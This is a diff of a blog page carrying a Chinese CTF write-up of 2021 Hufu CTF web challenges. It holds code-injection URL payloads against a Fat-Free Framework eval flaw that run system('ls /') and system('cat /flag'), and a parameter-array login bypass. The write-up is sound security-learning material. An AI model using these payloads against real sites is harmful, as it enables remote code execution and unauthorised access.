@@ -524,30 +524,26 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><img src="/2021/04/04/CTF_2021HFCTF/image-20210404234131332.png" alt=""></p>
-<h2 id="引言">引言</h2>
-<blockquote>
+                <p><img src="/2021/04/04/CTF_2021HFCTF/image-20210404234131332.png"></p>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote>
 <p><strong>2021 数字中国创新大赛虎符网络安全赛道</strong></p>
 <p>2021年4月3日 10:00-18:00</p>
 <p><a target="_blank" rel="noopener" href="https://www.ichunqiu.com/2021hfctf">https://www.ichunqiu.com/2021hfctf</a></p>
 </blockquote>
 <p>貌似有一段时间没来打 CTF 了，手有点生了。</p>
 <p>今年的虎符来的有点早，还赶上了清明假期，大家都比较忙，就来随意看看题好了吧（</p>
-<h2 id="Web">Web</h2>
-<h3 id="签到">签到</h3>
-<blockquote>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote>
 <p>师傅们常说，要善于学习，细致入微；师傅们也常说，要善于分享，总结归纳。</p>
-<p>2021年3月28日，PHP维护的官方Git服务器 <a target="_blank" rel="noopener" href="http://git.php.net">git.php.net</a> 被袭击，其Git仓库遭到恶意篡改。如果开发者使用这些遭到篡改的源代码进行网页的开发的话，网站就会在不知情的情况下被感染。</p>
+<p>2021年3月28日，PHP维护的官方Git服务器 git.php.net 被袭击，其Git仓库遭到恶意篡改。如果开发者使用这些遭到篡改的源代码进行网页的开发的话，网站就会在不知情的情况下被感染。</p>
 </blockquote>
 <p>参考新闻 <a target="_blank" rel="noopener" href="https://www.freebuf.com/news/267983.html">PHP的Git服务器被入侵，源代码被添加后门</a></p>
 <p>PHP 官方：<a target="_blank" rel="noopener" href="https://news-web.php.net/php.internals/113838">Changes to Git commit workflow</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d">https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d</a></p>
-<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403144902442.png" alt=""></p>
+<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403144902442.png"></p>
 <p>或者 <a target="_blank" rel="noopener" href="http://git.php.net/?p=php-src.git;a=blobdiff;f=ext/zlib/zlib.c;h=6964407837cb073cd04e8db9d2b2b0e4ccd8faf8;hp=02fb4dd207a29bb2e3f1fefb1cac5e0fab5ca146;hb=c730aa26bd52829a49f2ad284b181b7e82a68d7d;hpb=92aeda524b0b99ab0c861bcba62e5a471ba805e6">http://git.php.net/?p=php-src.git;a=blobdiff;f=ext/zlib/zlib.c;h=6964407837cb073cd04e8db9d2b2b0e4ccd8faf8;hp=02fb4dd207a29bb2e3f1fefb1cac5e0fab5ca146;hb=c730aa26bd52829a49f2ad284b181b7e82a68d7d;hpb=92aeda524b0b99ab0c861bcba62e5a471ba805e6</a></p>
 <p>直接在 header 打就好了。注意是两个<code>t</code>。</p>
 <p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403144908239.png" alt="payload"></p>
-<h3 id="unsetme">unsetme</h3>
-<blockquote>
+<h3 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h3><blockquote>
 <p>是缺陷还是漏洞呢。</p>
 </blockquote>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -567,12 +563,12 @@
 <p>是 <a target="_blank" rel="noopener" href="https://fatfreeframework.com/"><em>Fat-Free Framework</em></a> ，一查发现 3.7.1 版本存在 RCE 漏洞 <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2020-5203">CVE-2020-5203</a>。</p>
 <p>但这个漏洞在 3.7.2 修复了。</p>
 <p>根据 <code>/lib/CHANGELOG.md</code>，得知题目用到的版本是 <code>3.7.2 (28 May 2020)</code></p>
-<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403164308925.png" alt=""></p>
+<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403164308925.png"></p>
 <p>查看源码，当对不可访问的属性调用 <code>unset()</code> 时<code>__unset()</code>会被调用。</p>
-<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165119222.png" alt=""></p>
-<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165127320.png" alt=""></p>
-<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165041484.png" alt=""></p>
-<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210404234404768.png" alt=""></p>
+<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165119222.png"></p>
+<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165127320.png"></p>
+<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165041484.png"></p>
+<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210404234404768.png"></p>
 <p>在 <code>clear</code> 里有 <code>eval</code>，拼接字符串，但需要有 <code>$parts[1]</code></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">init</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token comment">// Reset global to default value</span>
@@ -590,19 +586,18 @@
         <span class="token variable">$cache</span><span class="token operator">-&gt;</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token variable">$hash</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>再看 changelog</p>
-<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165248921.png" alt=""></p>
+<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403165248921.png"></p>
 <p>根据 <a target="_blank" rel="noopener" href="https://github.com/bcosca/fatfree/issues/1206">https://github.com/bcosca/fatfree/issues/1206</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/bcosca/fatfree/issues/1191">https://github.com/bcosca/fatfree/issues/1191</a></p>
 <p>正则匹配对 <code>[]</code> 处理不当，于是构造 payload</p>
 <pre class="line-numbers language-none"><code class="language-none">/?a=SESSION[f3-reroute-info]);phpinfo(<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403163552160.png" alt=""></p>
+<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403163552160.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">/?a=SESSION[f3-reroute-info]);system('ls /'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403163641868.png" alt=""></p>
+<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403163641868.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">/?a=SESSION[f3-reroute-info]);system('cat /flag'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403163713448.png" alt=""></p>
+<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210403163713448.png"></p>
 <p><code>flag{dfc91022-dc9d-481a-8b46-cff1ce6e51be}</code></p>
-<h3 id="internal-system">internal_system</h3>
-<blockquote>
+<h3 id="internal-system"><a href="#internal-system" class="headerlink" title="internal_system"></a>internal_system</h3><blockquote>
 <p>开发了一个公司内部的请求代理网站，好像有点问题，但来不及了还是先上线吧（─.─||）</p>
 <p><a target="_blank" rel="noopener" href="http://8.140.152.226:47921/">http://8.140.152.226:47921/</a></p>
 <p><strong>hint:</strong> /source存在源码泄露；/proxy存在ssrf</p>
@@ -759,24 +754,26 @@ router<span class="token punctuation">.</span><span class="token function">get</
 
 module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>首先需要登录，这里用到了 JavaScript 弱类型的特性。</p>
-<p>参考 <a target="_blank" rel="noopener" href="https://www.gem-love.com/websecurity/2037.html">SuSeC CTF 2020 Writeup &amp; 基于Node.JS的sha1绕过分析</a></p>
+<p>参考 <a target="_blank" rel="noopener" href="https://www.gem-love.com/websecurity/2037.html">SuSeC CTF 2020 Writeup &amp; 基于Node.JS的sha1绕过分析</a> </p>
 <p>以及 <a target="_blank" rel="noopener" href="https://d6s3.ac.cn/post/nodejs-url-library-character-mapping-problem/">Node.js中url.parse函数的潜在安全问题</a></p>
 <p>JavaScript 在使用加号拼接的时候最终会得到一个字符串(string)，于是不会影响 sha256 的处理。</p>
-<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210404235528295.png" alt=""></p>
+<p><img src="/2021/04/04/CTF_2021HFCTF/image-20210404235528295.png"></p>
 <p>这里是用 GET query 传参，可以构造 payload</p>
 <pre class="line-numbers language-none"><code class="language-none">username[]=admin&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>就能成功以管理员身份进入。</p>
 <p>接下来打 ssrf……</p>
-<p><s>（题目环境关了复现不了了啊嘤嘤嘤</s></p>
-<p><s>（后面再搭环境复现吧</s> 赵总的 buuoj 开了环境👇</p>
+<p><del>（题目环境关了复现不了了啊嘤嘤嘤</del></p>
+<p><del>（后面再搭环境复现吧</del> 赵总的 buuoj 开了环境👇 </p>
 <p><strong>环境：</strong> <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5B%E8%99%8E%E7%AC%A6CTF%202021%5DInternal%20System">[虎符CTF 2021] Internal System</a></p>
 <p>这题太顶了！</p>
 <p>专门写了一篇复现这题的博客，移步下面这篇吧。</p>
 <p><a href="https://miaotony.xyz/2021/04/05/CTF_2021HFCTF_internal_system/">CTF | 2021 虎符CTF Web internal_system 复现</a></p>
 <br>
-<h2 id="小结">小结</h2>
-<p>就做出了两题 web，喵喵好菜啊是 fw，喵呜呜呜（</p>
-<p>不过有点佛系，就下午看了一下，快到晚上就出去玩了*（其实没认真打，这就逃走*</p>
+
+
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>就做出了两题 web，喵喵好菜啊是 fw，喵呜呜呜（</p>
+<p>不过有点佛系，就下午看了一下，快到晚上就出去玩了<em>（其实没认真打，这就逃走</em></p>
 <p><em>（溜了溜了喵</em></p>
 
                 
@@ -1341,7 +1338,7 @@ module<span class="token punctuation">.</span>exports <span class="token operato
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
                         &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">308.3k</span>&nbsp;字
+                class="white-color">308.1k</span>&nbsp;字
                                                                                     <span id="busuanzi_container_site_pv">
 			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                     class="white-color"></span>&nbsp;次
